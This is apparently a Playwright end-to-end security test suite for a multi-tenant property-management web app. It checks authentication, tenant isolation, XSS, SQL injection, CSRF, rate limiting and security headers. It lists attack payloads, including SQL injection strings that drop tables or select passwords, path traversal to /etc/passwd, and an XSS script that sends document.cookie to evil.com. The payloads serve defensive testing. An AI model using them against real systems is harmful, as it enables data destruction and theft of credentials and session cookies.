/**
 * COMPREHENSIVE SECURITY E2E TESTS
 * Tests authentication boundaries, cross-tenant isolation, and security controls
 */

import { expect, Page, test } from '@playwright/test'
import { v4 as uuidv4 } from 'uuid'

// Test users for multi-tenant testing
const testUsers = {
	userA: {
		name: 'Security Test User A',
		email: `security-test-a+${Date.now()}@example.com`,
		password: 'SecureTestPass123!',
		organizationId: uuidv4()
	},
	userB: {
		name: 'Security Test User B',
		email: `security-test-b+${Date.now()}@example.com`,
		password: 'SecureTestPass123!',
		organizationId: uuidv4()
	},
	admin: {
		name: 'Security Admin User',
		email: `security-admin+${Date.now()}@example.com`,
		password: 'AdminSecurePass123!',
		role: 'ADMIN'
	}
}

// Helper function to login user
async function loginUser(page: Page, email: string, password: string) {
	await page.goto('')
	await page.fill('input[name="email"]', email)
	await page.fill('input[name="password"]', password)
	await page.click('button[type="submit"]')
	await page.waitForLoadState('networkidle')
}

// Helper function to extract JWT token from localStorage
async function getJWTToken(page: Page): Promise<string | null> {
	return await page.evaluate(() => {
		const authData = localStorage.getItem('sb-supabase-auth-token')
		if (authData) {
			const parsed = JSON.parse(authData)
			return parsed.access_token || null
		}
		return null
	})
}

// Helper function to create malicious payloads
const maliciousPayloads = {
	sqlInjection: [
		"'; DROP TABLE User; --",
		"1' OR '1'='1",
		"'; SELECT * FROM User WHERE '1'='1",
		"admin'/*",
		"' UNION SELECT password FROM User WHERE email='admin@example.com'--"
	],
	xss: [
		'<script>alert("XSS")</script>',
		'<img src="x" onerror="alert(1)">',
		'javascript:alert("XSS")',
		'<svg onload="alert(1)">',
		'"><script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>'
	],
	pathTraversal: [
		'../../../etc/passwd',
		'..\\..\\windows\\system32\\config\\sam',
		'....//....//....//etc//passwd'
	]
}

test.describe('Security - Authentication & Authorization', () => {
	test('should reject unauthenticated API requests', async ({ page }) => {
		// Test API endpoints without authentication
		const apiEndpoints = [
			'/api/properties',
			'/api/tenants',
			'/api/leases',
			'/api/maintenance',
			'/api/dashboard/stats'
		]

		for (const endpoint of apiEndpoints) {
			const response = await page.request.get(`${process.env.NEXT_PUBLIC_APP_URL}${endpoint}`)

			// Should return 401 Unauthorized
			expect(response.status()).toBe(401)
		}
	})

	test('should validate JWT token format and expiration', async ({ page }) => {
		await page.goto('')

		// Test with malformed JWT tokens
		const invalidTokens = [
			'invalid.jwt.token',
			'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
			'', // empty token
			'Bearer ', // empty bearer
			'not-a-jwt-at-all'
		]

		for (const token of invalidTokens) {
			// Set invalid token in localStorage
			await page.evaluate((invalidToken) => {
				localStorage.setItem('sb-supabase-auth-token', JSON.stringify({
					access_token: invalidToken,
					refresh_token: 'fake_refresh'
				}))
			}, token)

			// Try to access protected route
			const response = await page.goto('/dashboard')

			// Should redirect to login due to invalid token
			await expect(page).toHaveURL(/.*\/auth\/login/)
		}
	})

	test('should enforce session timeout and token refresh', async ({ page }) => {
		// Login with valid credentials
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)

		// Simulate expired token by manipulating localStorage
		await page.evaluate(() => {
			const authData = localStorage.getItem('sb-supabase-auth-token')
			if (authData) {
				const parsed = JSON.parse(authData)
				// Set token to expire (past timestamp)
				parsed.expires_at = Math.floor(Date.now() / 1000) - 3600 // 1 hour ago
				localStorage.setItem('sb-supabase-auth-token', JSON.stringify(parsed))
			}
		})

		// Try to access protected route with expired token
		await page.goto('/dashboard')

		// Should redirect to login due to expired token
		await expect(page).toHaveURL(/.*\/auth\/login/)

		// Should show session expired message
		await expect(page.locator('text=Session expired')).toBeVisible()
	})

	test('should properly handle logout and token invalidation', async ({ page }) => {
		// Login first
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)
		await expect(page).toHaveURL(/.*\/dashboard/)

		// Get the token before logout
		const tokenBeforeLogout = await getJWTToken(page)
		expect(tokenBeforeLogout).toBeTruthy()

		// Logout
		await page.click('[data-testid="user-menu"]')
		await page.click('text=Logout')

		// Should redirect to home/login
		await expect(page).toHaveURL(/.*\/(auth\/login|$)/)

		// Token should be cleared from localStorage
		const tokenAfterLogout = await getJWTToken(page)
		expect(tokenAfterLogout).toBeNull()

		// Try to access protected route with old token in a new context
		await page.evaluate((token) => {
			localStorage.setItem('sb-supabase-auth-token', JSON.stringify({
				access_token: token,
				refresh_token: 'some_refresh'
			}))
		}, tokenBeforeLogout)

		await page.goto('/dashboard')
		// Should still redirect to login (server-side token invalidation)
		await expect(page).toHaveURL(/.*\/auth\/login/)
	})
})

test.describe('Security - Cross-Tenant Isolation', () => {
	test('should prevent cross-tenant data access via URL manipulation', async ({ page }) => {
		// This test requires two different user accounts
		// For now, test with URL parameter manipulation

		// Login as User A
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)

		// Try to access data with different organization IDs
		const maliciousOrgIds = [
			'00000000-0000-0000-0000-000000000000',
			uuidv4(), // Random UUID
			testUsers.userB.organizationId,
			'admin',
			'../admin',
			'null',
			'undefined'
		]

		for (const orgId of maliciousOrgIds) {
			// Try to access properties with malicious org ID
			await page.goto(`/properties?organizationId=${orgId}`)

			// Should either show empty results or redirect/error
			const errorMessage = page.locator('text=Access denied')
			const emptyState = page.locator('text=No properties found')
			const unauthorizedPage = page.locator('text=Unauthorized')

			// One of these should be present
			const hasSecurityResponse = await Promise.race([
				errorMessage.isVisible(),
				emptyState.isVisible(),
				unauthorizedPage.isVisible(),
				page.url().includes('') // Redirected to login
			])

			expect(hasSecurityResponse).toBeTruthy()
		}
	})

	test('should validate organization context in API requests', async ({ page }) => {
		// Login as User A
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)

		const token = await getJWTToken(page)
		expect(token).toBeTruthy()

		// Try to make API requests with different organization contexts
		const apiTests = [
			{
				endpoint: '/api/properties',
				method: 'GET',
				organizationId: testUsers.userB.organizationId
			},
			{
				endpoint: '/api/tenants',
				method: 'GET',
				organizationId: '00000000-0000-0000-0000-000000000000'
			},
			{
				endpoint: '/api/properties',
				method: 'POST',
				organizationId: uuidv4(),
				body: {
					name: 'Malicious Property',
					address: '123 Hacker St'
				}
			}
		]

		for (const apiTest of apiTests) {
			const options: any = {
				method: apiTest.method,
				headers: {
					'Authorization': `Bearer ${token}`,
					'Content-Type': 'application/json'
				}
			}

			if (apiTest.body) {
				options.data = {
					...apiTest.body,
					organizationId: apiTest.organizationId
				}
			}

			const response = await page.request.fetch(`${process.env.NEXT_PUBLIC_APP_URL}${apiTest.endpoint}`, options)

			// Should return 403 Forbidden or similar error
			expect([403, 401, 422]).toContain(response.status())
		}
	})

	test('should prevent admin privilege escalation', async ({ page }) => {
		// Login as regular user
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)

		// Try to access admin-only endpoints
		const adminEndpoints = [
			'/api/admin/users',
			'/api/admin/organizations',
			'/api/admin/system-stats',
			'/admin',
			'/admin/dashboard'
		]

		for (const endpoint of adminEndpoints) {
			await page.goto(endpoint)

			// Should either redirect or show access denied
			const hasProperResponse =
				page.url().includes('') ||
				page.url().includes('/dashboard') ||
				await page.locator('text=Access denied').isVisible() ||
				await page.locator('text=404').isVisible()

			expect(hasProperResponse).toBeTruthy()
		}
	})
})

test.describe('Security - Input Validation & XSS Prevention', () => {
	test('should sanitize user input and prevent XSS', async ({ page }) => {
		// Login first
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)
		await page.goto('/properties')

		// Try to create property with XSS payloads
		await page.click('[data-testid="add-property-button"]')

		for (const xssPayload of maliciousPayloads.xss) {
			// Fill form with XSS payload
			await page.fill('input[name="name"]', xssPayload)
			await page.fill('input[name="address"]', `123 Main St ${xssPayload}`)
			await page.fill('textarea[name="description"]', `Property description ${xssPayload}`)

			await page.click('button[type="submit"]')

			// Wait a moment for potential XSS to execute
			await page.waitForTimeout(500)

			// Check if XSS executed (it shouldn't)
			const alertHandled = await page.evaluate(() => {
				// Check if any alerts were triggered
				return window.alert.toString().includes('[native code]')
			})

			// XSS should not execute
			expect(alertHandled).toBeTruthy()

			// Form should either show error or sanitize input
			const hasSecurityResponse =
				await page.locator('text=Invalid input').isVisible() ||
				await page.locator('text=Error').isVisible() ||
				await page.locator('input[name="name"]').inputValue() !== xssPayload

			expect(hasSecurityResponse).toBeTruthy()
		}
	})

	test('should prevent SQL injection in search and filter inputs', async ({ page }) => {
		// Login first
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)

		// Test various pages with search functionality
		const searchPages = [
			{ url: '/properties', searchSelector: 'input[placeholder*="Search"]' },
			{ url: '/tenants', searchSelector: 'input[placeholder*="Search"]' },
			{ url: '/maintenance', searchSelector: 'input[placeholder*="Search"]' }
		]

		for (const pageTest of searchPages) {
			await page.goto(pageTest.url)

			const searchInput = page.locator(pageTest.searchSelector).first()
			if (await searchInput.isVisible()) {

				for (const sqlPayload of maliciousPayloads.sqlInjection) {
					// Enter SQL injection payload
					await searchInput.fill(sqlPayload)
					await searchInput.press('Enter')
					await page.waitForTimeout(1000)

					// Should not crash or reveal database errors
					const hasError = await page.locator('text=database error').isVisible() ||
									  await page.locator('text=SQL error').isVisible() ||
									  await page.locator('text=syntax error').isVisible()

					expect(hasError).toBeFalsy()

					// Should show normal search results or "no results found"
					const hasNormalResponse =
						await page.locator('[data-testid="search-results"]').isVisible() ||
						await page.locator('text=No results found').isVisible() ||
						await page.locator('text=No data').isVisible()

					expect(hasNormalResponse).toBeTruthy()
				}
			}
		}
	})

	test('should validate file uploads and prevent malicious uploads', async ({ page }) => {
		// Login first
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)

		// Navigate to a page with file upload (user profile/avatar)
		await page.goto('/profile')

		const fileInput = page.locator('input[type="file"]').first()
		if (await fileInput.isVisible()) {
			// Test malicious file types
			const maliciousFiles = [
				'malicious.exe',
				'script.js',
				'payload.html',
				'../../../etc/passwd',
				'normal.jpg.exe'
			]

			for (const filename of maliciousFiles) {
				// Create a fake file for testing
				await fileInput.setInputFiles({
					name: filename,
					mimeType: 'application/octet-stream',
					buffer: Buffer.from('malicious content')
				})

				// Try to upload
				await page.click('button[type="submit"]').catch(() => {})
				await page.waitForTimeout(1000)

				// Should reject malicious files
				const hasRejection =
					await page.locator('text=Invalid file type').isVisible() ||
					await page.locator('text=File not allowed').isVisible() ||
					await page.locator('text=Upload failed').isVisible()

				expect(hasRejection).toBeTruthy()
			}
		}
	})
})

test.describe('Security - Rate Limiting & DoS Protection', () => {
	test('should rate limit login attempts', async ({ page }) => {
		const maxAttempts = 5
		const invalidCredentials = {
			email: 'test@example.com',
			password: 'wrongpassword'
		}

		// Make multiple failed login attempts
		for (let i = 0; i < maxAttempts + 2; i++) {
			await page.goto('')
			await page.fill('input[name="email"]', invalidCredentials.email)
			await page.fill('input[name="password"]', invalidCredentials.password)
			await page.click('button[type="submit"]')
			await page.waitForTimeout(1000)
		}

		// Should show rate limiting message
		const isRateLimited =
			await page.locator('text=Too many attempts').isVisible() ||
			await page.locator('text=Please try again later').isVisible() ||
			await page.locator('text=Rate limited').isVisible()

		expect(isRateLimited).toBeTruthy()
	})

	test('should limit API request frequency', async ({ page }) => {
		// Login first to get valid token
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)
		const token = await getJWTToken(page)

		// Make rapid API requests
		const requests = Array.from({ length: 20 }, () =>
			page.request.get(`${process.env.NEXT_PUBLIC_APP_URL}/api/properties`, {
				headers: { 'Authorization': `Bearer ${token}` }
			})
		)

		const responses = await Promise.all(requests)

		// Some requests should be rate limited (429 status)
		const rateLimitedCount = responses.filter(r => r.status() === 429).length
		expect(rateLimitedCount).toBeGreaterThan(0)
	})
})

test.describe('Security - CSRF Protection', () => {
	test('should require CSRF token for state-changing operations', async ({ page }) => {
		// Login first
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)
		const token = await getJWTToken(page)

		// Try to make POST request without CSRF token
		const response = await page.request.post(`${process.env.NEXT_PUBLIC_APP_URL}/api/properties`, {
			headers: {
				'Authorization': `Bearer ${token}`,
				'Content-Type': 'application/json'
			},
			data: {
				name: 'Test Property',
				address: '123 Test St'
			}
		})

		// Should require CSRF token or reject the request
		expect([403, 422, 400]).toContain(response.status())
	})

	test('should validate CSRF token authenticity', async ({ page }) => {
		// Login and get to a form page
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)
		await page.goto('/properties')
		await page.click('[data-testid="add-property-button"]')

		// Try to submit form with invalid CSRF token
		await page.evaluate(() => {
			const csrfInputs = document.querySelectorAll('input[name*="csrf"]')
			csrfInputs.forEach(input => {
				if (input instanceof HTMLInputElement) {
					input.value = 'invalid-csrf-token'
				}
			})
		})

		await page.fill('input[name="name"]', 'Test Property')
		await page.fill('input[name="address"]', '123 Test St')
		await page.click('button[type="submit"]')

		// Should reject form submission
		const hasError =
			await page.locator('text=Invalid request').isVisible() ||
			await page.locator('text=Security error').isVisible() ||
			await page.locator('text=CSRF').isVisible()

		expect(hasError).toBeTruthy()
	})
})

test.describe('Security - Data Exposure Prevention', () => {
	test('should not expose sensitive data in client-side code', async ({ page }) => {
		await page.goto('/')

		// Check for exposed sensitive data in page source
		const pageContent = await page.content()

		// Should not contain sensitive information
		const sensitivePatterns = [
			/password['":\s]*['"]\w+/i,
			/secret['":\s]*['"]\w+/i,
			/private[_\s]*key/i,
			/supabase_service_role_key/i,
			/database[_\s]*password/i,
			/stripe[_\s]*secret/i
		]

		for (const pattern of sensitivePatterns) {
			expect(pageContent).not.toMatch(pattern)
		}
	})

	test('should not expose user data to unauthorized users', async ({ page }) => {
		// Login as User A
		await loginUser(page, testUsers.userA.email, testUsers.userA.password)
		await page.goto('/tenants')

		// Check that we can't see other users' data
		const pageContent = await page.content()

		// Should not contain other test users' emails
		expect(pageContent).not.toContain(testUsers.userB.email)
		expect(pageContent).not.toContain(testUsers.admin.email)

		// Should only show current user's data
		expect(pageContent).toContain(testUsers.userA.email)
	})

	test('should sanitize error messages', async ({ page }) => {
		// Test error responses don't leak sensitive information
		await page.goto('')
		await page.fill('input[name="email"]', 'nonexistent@example.com')
		await page.fill('input[name="password"]', 'wrongpassword')
		await page.click('button[type="submit"]')

		// Error should be generic, not revealing user existence
		const errorText = await page.locator('.text-red-6').first().textContent()

		// Should not reveal if user exists
		expect(errorText?.toLowerCase()).not.toContain('user not found')
		expect(errorText?.toLowerCase()).not.toContain('email does not exist')

		// Should be generic message
		expect(errorText?.toLowerCase()).toContain('invalid')
	})
})

test.describe('Security - Headers & Security Policies', () => {
	test('should have proper security headers', async ({ page }) => {
		const response = await page.goto('/')
		const headers = response?.headers()

		// Check for essential security headers
		expect(headers).toHaveProperty('x-frame-options')
		expect(headers).toHaveProperty('x-content-type-options')
		expect(headers).toHaveProperty('referrer-policy')

		// CSP header should be present
		const csp = headers?.['content-security-policy']
		expect(csp).toBeTruthy()

		// Should not expose server information
		expect(headers?.['server']).not.toMatch(/apache|nginx|iis/i)
		expect(headers?.['x-powered-by']).toBeFalsy()
	})

	test('should enforce HTTPS in production', async ({ page }) => {
		// This test assumes production environment
		if (process.env.NODE_ENV === 'production') {
			const response = await page.goto('/')

			// Should redirect to HTTPS
			expect(response?.url()).toMatch(/^https:\/\//)

			// Should have HSTS header
			const headers = response?.headers()
			expect(headers?.['strict-transport-security']).toBeTruthy()
		}
	})
})
